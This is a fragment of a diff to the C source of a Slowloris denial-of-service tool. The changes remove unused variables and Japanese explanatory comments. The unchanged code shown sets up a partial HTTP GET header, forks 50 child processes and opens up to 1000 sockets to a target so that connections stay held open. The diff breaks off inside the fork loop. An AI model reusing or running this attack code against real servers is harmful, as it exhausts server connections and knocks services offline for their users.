@@ -28,10 +28,8 @@ char header[1024] = "GET /toto HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozill
 char keep_alive[16] = "X-a: b\r\n";
 char target[1024] = "";
 int port = 80;
-int timeout = 10;
 int fork_nbr = 50;
 int con_nbr = 1000;
-int test = 0; // used as boolean
 int duration = 600;
 int nbr_test = 50; 
 
@@ -40,21 +38,14 @@ int slowloris(Arguments *args)
     SOCKADDR_IN serveraddr = { 0 };
     int sock[con_nbr];
     int pids[con_nbr];
-    // sockをsockの配列分0で埋める
-    // sizeof(sock) == sizeof(int) * con_nbr;
     memset(sock, -1, sizeof(sock));
-
-    // serveraddrの先頭アドレスから、serveraddr分0で埋める
     bzero(&serveraddr, sizeof(serveraddr));
     serveraddr.sin_family = AF_INET;
-    // inet_addrはIPアドレスを32bitのバイナリ値に変換する
-    // 実装部はこんな感じtypedef __uint32_t      in_addr_t;      /* base type for internet address */}
     serveraddr.sin_addr.s_addr = inet_addr(args->target_host);
     serveraddr.sin_port = htons(args->target_port);
 
-    // 50個、子プロセスを作成して、コネクションをできるだけ長く接続しておく
+    // create son proccess
     for(int i = 0; i<fork_nbr; i++) {
-        // 子プロセスを作成する
         int pid = fork();
         if(pid == 0) {
             while(1) {
